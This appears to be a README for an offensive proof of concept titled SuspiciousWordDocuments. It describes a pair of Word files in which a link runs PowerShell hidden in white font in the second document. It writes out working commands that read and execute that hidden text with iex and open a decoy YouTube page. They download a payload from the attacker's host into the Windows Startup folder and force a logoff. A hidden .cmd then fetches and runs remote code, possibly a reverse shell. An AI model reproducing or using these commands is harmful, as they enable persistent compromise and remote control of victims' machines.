# SuspiciousWordDocuments
You have received two Microsoft Word documents. Are the links safe?

# Description
Things aren't always what they seem when it comes to links. One document contains several links to different things on the web. The other looks like another plain document.
The RealJuicyWebLinks.docx file has a link that executes a PowerShell Command contained in wordfornotes.docx. Scenario: The wordfornotes commands are a way to establish persistence by grabbing the contents of a file from a hosted webserver and it's deposited in the user's Startup folder as .cmd. The .cmd example below is made to parse a file that could contain a reverse shell. A shutdown /l command is the last step to execute the .cmd file upon login from the user.

# Remember
wordfornotes.docx is saved in white font. 

This only works on Windows 10 and not windows 11. To work properly, save both files to downloads. Add your hosted IP, directory, and file to Document1 that you wished to be parsed/saved to the startup directory.

# How to use
Link number 1 must be copied and pasted to the Window's Search Box. wordfornotes.docx cannot be opened at the same time of Window's Search Box execution. If testing, remember to kill wordfornotes.docx.

Add your IP, Directory, and filename to wordfornotes.docx. Note: commands could be encoded in base64.

Both files saved to Downloads.

If you edit RealJuicyWebLinks, the suspicious link may need to be updated as well back to the initial.

# Stages
Call the other word document
```Powershell
c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "&{$word = new-object -comobject word.application; $word.visible = $false; $doc = $word.Documents.Open(\"$env:userprofile\downloads\Document1.docx\"); $doc.Paragraphs[1].range.text | iex}"
```
Request the commands hosted on a particular site
```Powershell
start msedge `https://www.youtube.com/watch?v=uXbGQiXsRes';iwr https://<YourIP>/Direcotory/filename -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartUp.cmd"; shutdown /l
```

# Example .cmd
```batch
@echo off

powershell.exe -windowstyle hidden "(iwr https:// YOUR IP/DIRECTORY/filename -UseBasicParsing) | iex"
```
